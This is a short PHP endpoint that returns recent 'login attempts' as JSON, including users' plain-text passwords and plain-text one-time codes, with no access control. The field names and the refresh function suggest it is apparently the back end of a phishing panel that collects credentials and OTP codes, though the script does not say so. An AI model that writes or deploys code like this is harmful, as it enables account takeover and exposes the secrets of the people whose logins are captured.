<?php
// File: refresh_attempts.php
include 'db_connect.php';

// Ensure no output before JSON response
ob_start();

ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_log('c:/xampp/php/logs/php_error.log');

header('Content-Type: application/json');

error_log("refresh_attempts.php: Script started");

// Log database connection status
if ($conn->connect_error) {
    error_log("Database connection failed: " . $conn->connect_error);
    echo json_encode(['success' => false, 'message' => 'Database connection failed']);
    exit;
}

$response = ['success' => true, 'message' => '', 'loginAttempts' => []];

try {
    // Fetch login attempts, including plain text OTP
    $sqlFetch = "SELECT id, userId, password, question, otp_plain, date, status FROM login_attempts ORDER BY date DESC LIMIT 50";
    $resultFetch = $conn->query($sqlFetch);

    if ($resultFetch->num_rows > 0) {
        while ($row = $resultFetch->fetch_assoc()) {
            $response['loginAttempts'][] = [
                'id' => $row['id'],
                'userId' => $row['userId'],
                'password' => $row['password'],
                'question' => $row['otp_plain'], // Use plain text OTP for display
                'date' => $row['date'],
                'status' => $row['status']
            ];
        }
    }
} catch (Exception $e) {
    error_log("Error: " . $e->getMessage());
    $response['success'] = false;
    $response['message'] = $e->getMessage();
}

$conn->close();

// Output the combined response
echo json_encode($response);

// End of script
ob_end_flush(); // Flush the output buffer and send the response
?>